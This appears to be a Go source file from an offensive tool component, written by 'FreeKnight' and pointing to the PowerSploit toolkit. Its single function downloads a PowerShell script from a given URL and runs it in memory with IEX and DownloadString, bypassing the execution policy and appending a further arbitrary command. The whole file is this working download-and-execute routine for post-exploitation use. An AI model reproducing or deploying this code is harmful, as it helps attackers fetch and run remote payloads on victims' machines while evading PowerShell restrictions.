/*
Author: FreeKnight
执行指定的Power脚本
*/
//具体脚本可参见：https://github.com/PowerShellMafia/PowerSploit
//------------------------------------------------------------
package components
//------------------------------------------------------------
import (
	"fmt"
	"os/exec"
)
//------------------------------------------------------------
func runPowershell(url string, shell string)(string, error) {
	cmd := fmt.Sprintf(`IEX (New-Object Net.WebClient).DownloadString('%s')`, url)
	binary, err := exec.LookPath("powershell")
	if err != nil{
		return "", err
	}
	err = exec.Command(binary, fmt.Sprintf(`PowerShell -ExecutionPolicy Bypass -NoLogo -NoExit -Command "%s;%s"`, cmd, shell)).Run()
	if err != nil{
		return "", err
	}

	// todo: get the output from command line.
	return "RunPowershell successed.", nil
}
//------------------------------------------------------------